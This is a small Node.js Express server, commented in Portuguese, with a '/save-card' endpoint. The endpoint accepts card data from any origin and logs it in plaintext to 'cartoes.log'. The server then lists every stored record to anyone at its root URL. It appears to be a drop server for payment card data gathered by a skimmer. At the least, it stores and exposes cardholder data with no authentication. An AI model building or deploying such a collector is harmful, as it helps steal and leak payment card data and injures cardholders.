// index.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, 'cartoes.log');

app.use(cors());
app.use(express.json({ limit: '2mb' }));

app.post('/save-card', (req, res) => {
  const payload = { ...req.body, ts: new Date().toISOString() };
  fs.appendFileSync(LOG_FILE, JSON.stringify(payload) + '\n');
  res.json({ ok: true });
});

app.get('/', (_req, res) => {
  if (!fs.existsSync(LOG_FILE)) return res.send('--- nenhum cartão ainda ---');
  const data = fs.readFileSync(LOG_FILE, 'utf8')
                .split('\n')
                .filter(Boolean)
                .map(JSON.parse);
  res.json(data);
});

app.listen(PORT, () => console.log('Rodando na porta', PORT));
